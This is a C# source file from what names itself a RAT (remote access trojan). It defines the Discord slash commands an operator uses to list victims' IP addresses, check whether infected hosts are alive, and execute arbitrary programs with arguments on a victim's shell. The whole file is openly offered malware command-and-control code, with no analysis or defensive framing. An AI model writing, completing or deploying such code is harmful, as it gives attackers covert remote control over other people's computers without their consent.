using Discord;
using Discord.WebSocket;

namespace RAT;

public struct CommandBuilder
{
    public static CommandBuilder Shared = new();
    /// <summary>
    /// Build all bot commands for a specific Guild (Discord Server)
    /// </summary>
    /// <param name="guild">Socket of the Guild.</param>
    public async Task BuildFor(SocketGuild guild)
        => await guild.BulkOverwriteApplicationCommandAsync(this.BuildCommands().ToArray());
    /// <summary>
    /// Build all bot commands for the whole bot | Takes two hours to apply between iterations.
    /// </summary>
    /// <param name="client">Bot Client.</param>
    public async Task BuildApp(DiscordSocketClient client)
        => await client.BulkOverwriteGlobalApplicationCommandsAsync(BuildCommands().ToArray());

    private List<SlashCommandProperties> BuildCommands()
    {
        List<SlashCommandProperties> commands = new();

        SlashCommandBuilder getIpCmd = new()
        {
            Name = "getip",
            Description = "Get the IP of all the victims"
        };

        SlashCommandBuilder pingCommand = new()
        {
            Name = "ping",
            Description = "Get the last heartbeat from the Gateway to our bot"
        };
        pingCommand.AddOption("victim", ApplicationCommandOptionType.String, "the Ip of the victim", true, false);

        SlashCommandBuilder rebuildCmd = new()
        {
            Name = "rebuildcmd",
            Description = "Rebuild the available slash commands"
        };
        rebuildCmd.AddOption("victim", ApplicationCommandOptionType.String, "the Ip of the victim", true, false);

        SlashCommandBuilder exOnShellCmd = new()
        {
            Name = "shell",
            Description = "Executes a program on the victims OS shell"
        };
        exOnShellCmd.AddOption("victim", ApplicationCommandOptionType.String, "the Ip of the victim", true, false);
        exOnShellCmd.AddOption("program", ApplicationCommandOptionType.String, "The PATH to the program, it can be just the program name if present on PATH", true, false);
        exOnShellCmd.AddOption("arguments", ApplicationCommandOptionType.String, "The arguments you want the program to run with", false, false);


        commands.Add(pingCommand.Build());
        commands.Add(rebuildCmd.Build());
        commands.Add(getIpCmd.Build());
        commands.Add(exOnShellCmd.Build());

        return commands;
    }
}
